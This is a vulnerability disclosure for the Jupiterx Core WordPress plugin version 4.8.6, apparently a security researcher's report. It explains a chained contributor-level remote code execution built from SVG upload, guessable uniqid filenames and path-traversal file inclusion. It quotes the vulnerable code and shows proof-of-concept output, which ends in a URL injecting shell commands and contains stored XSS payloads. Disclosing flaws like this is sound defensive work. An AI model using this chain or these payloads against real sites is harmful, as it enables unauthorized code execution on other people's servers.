# Jupiterx Core Authenticated (Contributor+) Remote Code Execution

The Jupiterx Core plugin version: 4.8.6 is vulnerable to an Authenticated (Contributor+) Remote Code Execution attack by chaining multiple vulnerabilities together. A user can create a form that allows arbitrary SVG uploads, a random name is give to the file but this can be brute forced due to insufficient randomness or leaked via email. This can then be paired with an SVG limited file inclusion to get remote code execution. 

## Affected Plugin

Title: Jupiterx Core
Active installations: 180,000 (https://themeforest.net/item/jupiter-multipurpose-responsive-theme)
Version: 4.8.6
Slug: jupiterx-core
Link: https://jupiterx.com/

## Root Cause

Note this remote code execution vulnerability is caused by **chaining** multiple vulnerabilities together (~3).

1. **Limited Arbitrary File Upload** - We can create a form and upload a SVG file
2. **Insufficient randomness in uploaded filenames** - A limited brute for allows us to guess the uploaded filename
3. **Limited File Inclusion** - An elementor video widget allows arbitrary inclusion of SVG files via a path traversal that will be executed as PHP files if they contain any PHP tags.

### Limited Arbitrary File Upload Code

In `includes/extensions/raven/includes/modules/forms/classes/ajax-handler.php` on line 434 the `move_uploaded_file` function is used to move a file after prevent some blacklisted file extensions.

```php
$move_new_file = @move_uploaded_file( $file['tmp_name'], $new_file );
```

### Insufficient Randomness in Filename Code

In `includes/extensions/raven/includes/modules/forms/classes/ajax-handler.php` on line 423 the `uniqid` function is used to generate a "random" filename for the upload file:

```php
$filename       = uniqid() . '.' . $file_extension;
```

However, this is not random and can be guessed if a small enough time-window for the generation is known.

### File Inclusion Code

In `includes/extensions/raven/includes/modules/video/widgets/video.php` on line 1360 user-controllable parameter(s) `device_frame` is used in an `include` statement after going through the `get_svg` function:

```php
<?php include Utils::get_svg( 'frame-' . $settings['device_frame'] ); ?>
```

Where `get_svg` is defined in `includes/extensions/raven/includes/utils.php` on lines 82-87 and simply concatenates the input into a path, allowing for path traversal to include any SVG file on the system:

```php
public static function get_svg( $file_name = '' ) {
    if ( empty( $file_name ) ) {
        return $file_name;
    }
    
    return Plugin::$plugin_path . 'assets/img/' . $file_name . '.svg';
```

## Proof of Concept

**Note**: For this exploit to work it requires either: 
1. A limited brute force that is done by guessing a value of `uniqid` which is time-based. This means that the source and target should have synced times.
2. Email set up, the form data is emailed to a user-controllable email address, so we can leak the filenames to ourselves (THIS IS THE EASIER METHOD)

1. Install and activate the `jupiterx` theme and the `elementor` and `jupiterx-core` plugins
2. Modify the exploit for your target:
```python
USER = 'user'
PASSWORD = 'user'
METHOD = 'EMAIL'  # Either BRUTE or EMAIL (RECOMMENDED)
EMAIL_ADDRESS = 'attacker@vulnerability.com'  # If using email enter an email address to receive the filename to
TARGET = 'http://wordpress.local:1337'  # No trailing slash
```
3. Run the Python PoC:

```
❯ python3 exploit.py
[+] Login Successful
[+] Nonce: c3c580ab2d
[+] Next Post ID: 382
[+] API Nonce: c00c13af67
[+] Post ID: 382
{'success': True, 'data': {'responses': {'save_builder': {'success': True, 'code': 200, 'data': {'status': 'pending', 'config': {'document': {'last_edited': 'Last edited on <time>Jan 6, 17:53</time> by user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userf`)"x= user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userl`)"x=', 'urls': {'wp_preview': 'http://wordpress.local:1337/?p=382&preview_id=382&preview_nonce=491384df60&preview=true'}, 'status': {'value': 'pending', 'label': 'Pending'}, 'revisions': {'current_id': 382}}}, 'latest_revisions': [{'id': 382, 'author': 'user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userf`)"x= user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userl`)"x=', 'timestamp': 1736186009, 'date': '<time>1 second</time> ago (<time>Jan 6 @ 17:53</time>)', 'type': 'current', 'typeLabel': 'Current Version', 'gravatar': "<img alt='' src='http://2.gravatar.com/avatar/529f87bc7a8018879c05c249c93d3b44?s=22&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/529f87bc7a8018879c05c249c93d3b44?s=44&#038;d=mm&#038;r=g 2x' class='avatar avatar-22 photo' height='22' width='22' decoding='async'/>"}, {'id': 196, 'author': 'user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userf`)"x= user"id="x"tabindex="1"autofocus="1"onfocus="alert(`userl`)"x=', 'timestamp': 1736186009, 'date': '<time>1 second</time> ago (<time>Jan 6 @ 17:53</time>)', 'type': 'revision', 'typeLabel': 'Revision', 'gravatar': "<img alt='' src='http://2.gravatar.com/avatar/529f87bc7a8018879c05c249c93d3b44?s=22&#038;d=mm&#038;r=g' srcset='http://2.gravatar.com/avatar/529f87bc7a8018879c05c249c93d3b44?s=44&#038;d=mm&#038;r=g 2x' class='avatar avatar-22 photo' height='22' width='22' decoding='async'/>"}], 'revisions_ids': [382, 196]}}}}}
[+] Created Post with form: 382
[+] Visit: http://wordpress.local:1337/?p=382
[+] Form ID: 10ab6ec
[+] Field ID: 856fd19
[+] Upload Success
[+] Window: 0.4266054630279541s (1736189757.1574607 - 1736189757.5840662)
Please enter an SVG filename, the filenames should be contained in an email you have received
Enter File Name (e.g. 677c256fe7327): 
677c273d7f7aa
[+] Found LFI!!!
[+] Visit: http://wordpress.local:1337/?p=382&cmd=id;ls%20-lah
```
4. Visit the page to observe command execution